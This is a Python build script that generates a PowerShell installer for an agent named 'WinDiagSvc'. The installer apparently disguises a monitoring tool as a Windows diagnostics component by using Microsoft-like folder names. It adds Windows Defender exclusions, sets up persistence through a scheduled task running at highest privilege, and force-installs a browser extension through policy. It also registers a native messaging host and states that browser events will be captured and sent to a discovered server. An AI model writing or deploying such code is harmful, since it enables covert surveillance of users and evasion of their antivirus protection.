"""
make_installer.py - Generate the PowerShell installer script.

Usage:
    python tools/make_installer.py \
       --version  1.0.42 \
       --ext-id   cngajkfiaohlbgdippmdgjaknieojjlb \
       --out      build/Install-WinDiagSvc.ps1
"""

import argparse
from datetime import datetime, timezone
from pathlib import Path


INSTALLER_TEMPLATE = r'''#Requires -RunAsAdministrator
# WinDiagSvc Installer v{VERSION}
# Generated: {GENERATED}
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File Install-WinDiagSvc.ps1 -ApiKey "your-key"
#   powershell -ExecutionPolicy Bypass -File Install-WinDiagSvc.ps1 -ApiKey "key" -ServerUrl "https://192.168.1.100:49213"

param(
    [string]$ApiKey    = "{API_KEY}",
    [string]$ServerUrl = ""
)

$ErrorActionPreference = "Continue"
$Version     = "{VERSION}"
$TaskName    = "WinDiagSvc"
$InstallDir  = "C:\Program Files\Windows Diagnostics"
$DataDir     = "$env:ProgramData\Microsoft\Diagnostics"
$ExtensionId = "{EXTENSION_ID}"
$SrcDir      = $PSScriptRoot

function Write-Step {{ param($M) Write-Host "`n==> $M" -ForegroundColor Cyan }}
function Write-OK   {{ param($M) Write-Host "    OK: $M" -ForegroundColor Green }}
function Write-Warn {{ param($M) Write-Host "    WARN: $M" -ForegroundColor Yellow }}

# ---------------------------------------------------------------------------
# Server discovery via mDNS (_windiag._tcp.local) or explicit URL
# ---------------------------------------------------------------------------
function Find-WinDiagServer {{
    if ($ServerUrl) {{ return $ServerUrl }}

    try {{
        $group  = [System.Net.IPAddress]::Parse("224.0.0.251")
        $client = New-Object System.Net.Sockets.UdpClient
        $client.Client.ReceiveTimeout = 3000

        $labels = "_windiag","_tcp","local"
        $query  = New-Object System.Collections.Generic.List[byte]
        $query.AddRange([byte[]](0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00))
        foreach ($label in $labels) {{
            $b = [System.Text.Encoding]::ASCII.GetBytes($label)
            $query.Add([byte]$b.Length)
            $query.AddRange($b)
        }}
        $query.Add(0)
        $query.AddRange([byte[]](0x00,0x0C,0x00,0x01))

        $ep   = New-Object System.Net.IPEndPoint($group, 5353)
        $data = $query.ToArray()
        $client.Send($data, $data.Length, $ep) | Out-Null

        $from     = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        $response = $client.Receive([ref]$from)
        $client.Close()

        $pos     = 12
        $qdCount = ($response[4] -shl 8) -bor $response[5]
        for ($i = 0; $i -lt $qdCount; $i++) {{
            while ($pos -lt $response.Length) {{
                if ($response[$pos] -eq 0)                         {{ $pos++; break }}
                if (($response[$pos] -band 0xC0) -eq 0xC0)        {{ $pos += 2; break }}
                $pos += $response[$pos] + 1
            }}
            $pos += 4
        }}

        $totalRR = (($response[6] -shl 8) -bor $response[7]) +
                   (($response[8] -shl 8) -bor $response[9]) +
                   (($response[10]-shl 8) -bor $response[11])
        $port    = $null
        $ip      = $from.Address.ToString()

        for ($i = 0; $i -lt $totalRR -and $pos + 10 -le $response.Length; $i++) {{
            while ($pos -lt $response.Length) {{
                if ($response[$pos] -eq 0)                         {{ $pos++; break }}
                if (($response[$pos] -band 0xC0) -eq 0xC0)        {{ $pos += 2; break }}
                $pos += $response[$pos] + 1
            }}
            if ($pos + 10 -gt $response.Length) {{ break }}
            $type  = ($response[$pos] -shl 8)  -bor $response[$pos+1]
            $rdLen = ($response[$pos+8] -shl 8) -bor $response[$pos+9]
            $pos  += 10
            if ($type -eq 33 -and $rdLen -ge 7) {{
                $port = ($response[$pos+4] -shl 8) -bor $response[$pos+5]
            }} elseif ($type -eq 1 -and $rdLen -eq 4) {{
                $ip = "$($response[$pos]).$($response[$pos+1]).$($response[$pos+2]).$($response[$pos+3])"
            }}
            $pos += $rdLen
        }}

        if ($port) {{ return "https://${{ip}}:${{port}}" }}
    }} catch {{ }}
    return $null
}}

function Send-InstallError {{ param($Stage, $Message) {{
    try {{
        $url = Find-WinDiagServer
        if (-not $url) {{ return }}
        $mid = if ($env:COMPUTERNAME) {{ $env:COMPUTERNAME }} else {{ "unknown" }}
        $body = @{{
            machine_id = $mid; stage = $Stage; error = $Message
            os_version = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            ts         = (Get-Date -Format o)
        }} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$url/api/v1/errors" `
           -Method POST -Body $body -ContentType "application/json" `
           -Headers @{{"X-Api-Key"=$ApiKey}} `
           -SkipCertificateCheck -ErrorAction SilentlyContinue | Out-Null
    }} catch {{ }}
}}}}

# ---------------------------------------------------------------------------
# 0. Verify companion files
# ---------------------------------------------------------------------------
Write-Step "Verifying installer files"
$required = @("WinDiagSvc.exe","extension.crx","native-messaging-host.json","appsettings.json","WinDiagUpdater.ps1")
foreach ($f in $required) {{
    if (-not (Test-Path "$SrcDir\$f")) {{
        Send-InstallError "verify_files" "Missing: $SrcDir\$f"
        Write-Error "Missing required file: $SrcDir\$f"
        exit 1
    }}
}}
Write-OK "All files present"

# ---------------------------------------------------------------------------
# 1. Create directories
# ---------------------------------------------------------------------------
Write-Step "Creating directories"
try {{
    New-Item -ItemType Directory -Force -Path $InstallDir     | Out-Null
    New-Item -ItemType Directory -Force -Path $DataDir        | Out-Null
    New-Item -ItemType Directory -Force -Path "$DataDir\cache"| Out-Null
    New-Item -ItemType Directory -Force -Path "$DataDir\logs" | Out-Null
    Write-OK $InstallDir
}} catch {{
    Send-InstallError "create_dirs" "$_"
    Write-Error "Failed to create directories: $_"
    exit 1
}}

# ---------------------------------------------------------------------------
# 2. Copy files
# ---------------------------------------------------------------------------
Write-Step "Installing agent files"
try {{
    foreach ($f in $required) {{ Copy-Item "$SrcDir\$f" $InstallDir -Force }}
    if (Test-Path "$SrcDir\extension") {{
        # Remove old directory first to avoid PowerShell Recurse nesting old dir inside new
        Remove-Item "$InstallDir\extension" -Recurse -Force -ErrorAction SilentlyContinue
        Copy-Item "$SrcDir\extension" "$InstallDir\extension" -Recurse -Force
    }}
    Write-OK "Files copied to $InstallDir"
}} catch {{
    Send-InstallError "copy_files" "$_"
    Write-Error "Failed to copy files: $_"
    exit 1
}}

# ---------------------------------------------------------------------------
# 3. Patch appsettings.json (ApiKey, ServerUrl, ExtensionId)
# ---------------------------------------------------------------------------
Write-Step "Configuring appsettings.json"
try {{
    $cfgPath = "$InstallDir\appsettings.json"
    $cfg     = Get-Content $cfgPath -Raw | ConvertFrom-Json
    $cfg.AgentSettings.ApiKey      = $ApiKey
    $cfg.AgentSettings.ServerUrl   = $ServerUrl
    $cfg.AgentSettings.ExtensionId = $ExtensionId
    $cfg | ConvertTo-Json -Depth 10 | Set-Content $cfgPath -Encoding UTF8
    Write-OK "ApiKey, ServerUrl, ExtensionId written"
}} catch {{
    Send-InstallError "patch_config" "$_"
    Write-Warn "Config patch failed: $_"
}}

# ---------------------------------------------------------------------------
# 4. Windows Defender exclusions
# ---------------------------------------------------------------------------
Write-Step "Adding Defender exclusions"
try {{
    Add-MpPreference -ExclusionPath $InstallDir
    Add-MpPreference -ExclusionPath $DataDir
    Write-OK "Exclusions added"
}} catch {{
    Send-InstallError "defender" "$_"
    Write-Warn "Defender exclusion failed (non-critical): $_"
}}

# ---------------------------------------------------------------------------
# 5. Scheduled Task (AtLogOn, Interactive)
# ---------------------------------------------------------------------------
Write-Step "Registering Scheduled Task: $TaskName"
try {{
    $prev = $ErrorActionPreference; $ErrorActionPreference = "SilentlyContinue"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false 2>&1 | Out-Null
    $ErrorActionPreference = $prev

    $exe       = "$InstallDir\WinDiagSvc.exe"
    $action    = New-ScheduledTaskAction -Execute $exe
    $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $settings  = New-ScheduledTaskSettingsSet `
       -ExecutionTimeLimit 0 -RestartCount 3 `
       -RestartInterval (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $principal = New-ScheduledTaskPrincipal `
       -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask `
       -TaskName $TaskName -Action $action -Trigger $trigger `
       -Settings $settings -Principal $principal -Force | Out-Null

    Write-OK "Task registered for user: $env:USERNAME"
}} catch {{
    Send-InstallError "scheduled_task" "$_"
    Write-Error "Failed to register scheduled task: $_"
    exit 1
}}

# ---------------------------------------------------------------------------
# 6. Native Messaging Host
# ---------------------------------------------------------------------------
Write-Step "Registering Native Messaging Host"
try {{
    $exe          = "$InstallDir\WinDiagSvc.exe"
    $hostManifest = "$InstallDir\native-messaging-host.json"
    $m = Get-Content $hostManifest -Raw | ConvertFrom-Json
    $m.path = $exe
    $m | ConvertTo-Json -Depth 5 | Set-Content $hostManifest -Encoding UTF8

    foreach ($p in @(
        "HKLM:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.windiag.host",
        "HKLM:\SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.windiag.host"
    )) {{
        New-Item -Force -Path $p | Out-Null
        Set-ItemProperty -Path $p -Name "(Default)" -Value $hostManifest
    }}
    Write-OK "Native Messaging registered (Chrome + Edge)"
}} catch {{
    Send-InstallError "native_messaging" "$_"
    Write-Warn "Native messaging registration failed: $_"
}}

# ---------------------------------------------------------------------------
# 7. Browser extension setup
# ---------------------------------------------------------------------------
Write-Step "Setting up browser extension"
$ExtHostPort = 9876

# HKLM policy - works on domain/managed machines (Chrome ignores on personal machines)
foreach ($pol in @(
    "HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist",
    "HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"
)) {{
    try {{
        New-Item -Force -Path $pol | Out-Null
        $existing = (Get-ItemProperty -Path $pol -EA SilentlyContinue).PSObject.Properties |
                    Where-Object {{ $_.Name -match '^\d+$' }} | ForEach-Object {{ [int]$_.Name }}
        $nextKey  = if ($existing) {{ ($existing | Measure-Object -Maximum).Maximum + 1 }} else {{ 1 }}
        Set-ItemProperty -Path $pol -Name "$nextKey" -Value "$ExtensionId;http://localhost:$ExtHostPort/update_manifest.xml"
    }} catch {{ }}
}}

# Detect domain membership
$isDomain = (Get-WmiObject Win32_ComputerSystem -EA SilentlyContinue).PartOfDomain

if ($isDomain) {{
    Write-OK "Domain machine: extension will force-install via policy on Chrome restart."
}} else {{
    # Chrome 133+ blocks force-install from non-CWS on personal machines.
    # The only reliable method: Load unpacked from the installed extension folder.
    # The manifest.json includes the public key, so the ID is always cngajkfiaohlbgdippmdgjaknieojjlb.
    $extFolder = "$InstallDir\extension"

    Write-Host ""
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host " BROWSER EXTENSION - ONE-TIME MANUAL STEP"                 -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host " Chrome 133+ blocks auto-install on personal machines."
    Write-Host " Load unpacked once - persists across restarts and updates."
    Write-Host ""
    Write-Host " 1. Chrome will open at chrome://extensions"
    Write-Host " 2. Enable 'Developer mode' (toggle, top right)"
    Write-Host " 3. Click 'Load unpacked'"
    Write-Host " 4. Select this folder:" -ForegroundColor Yellow
    Write-Host "    $extFolder" -ForegroundColor Cyan
    Write-Host " 5. Click OK - extension appears with ID: $ExtensionId"
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host ""

    # Copy folder path to clipboard for convenience
    try {{
        $extFolder | clip
        Write-OK "Extension folder path copied to clipboard"
    }} catch {{ }}

    # Open Chrome to the extensions page
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
        "C:\Program Files\Google\Chrome\Application\chrome.exe",
        "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
    )
    $chrome = $chromePaths | Where-Object {{ Test-Path $_ }} | Select-Object -First 1
    if ($chrome) {{
        Start-Process $chrome "chrome://extensions"
        Write-OK "Chrome opened at chrome://extensions"
    }} else {{
        Write-Warn "Chrome not found - open chrome://extensions manually"
    }}
}}

# ---------------------------------------------------------------------------
# 8. Start agent
# ---------------------------------------------------------------------------
Write-Step "Starting agent"
try {{
    Start-ScheduledTask -TaskName $TaskName
    Start-Sleep -Seconds 3
    $state = (Get-ScheduledTask -TaskName $TaskName).State
    if ($state -eq "Running") {{
        Write-OK "Agent is running"
    }} else {{
        Write-Warn "Task state: $state - check logs at $DataDir\logs"
        Send-InstallError "start_agent" "Task state after start: $state"
    }}
}} catch {{
    Send-InstallError "start_agent" "$_"
    Write-Warn "Could not start agent: $_"
}}

# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host " WinDiagSvc v$Version - installed!"     -ForegroundColor Green
Write-Host " Task    : $TaskName (AtLogOn)"
Write-Host " Data    : $DataDir"
Write-Host " Logs    : $DataDir\logs"
Write-Host " Server  : $(if ($ServerUrl) {{ $ServerUrl }} else {{ 'auto (mDNS)' }})"
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

if (-not $isDomain) {{
    Write-Host ""
    Write-Host ">>> After loading the extension in Chrome, browser events will be captured." -ForegroundColor Cyan
}}
'''


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--version", required=True)
    parser.add_argument("--ext-id",  required=True)
    parser.add_argument("--api-key", default="")
    parser.add_argument("--out",     required=True)
    args = parser.parse_args()

    script = INSTALLER_TEMPLATE.format(
        VERSION=args.version,
        GENERATED=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
        EXTENSION_ID=args.ext_id,
        API_KEY=args.api_key,
    )

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(script, encoding="utf-8")
    print(f"OK Installer: {out}  ({out.stat().st_size / 1024:.1f} KB)")


if __name__ == "__main__":
    main()
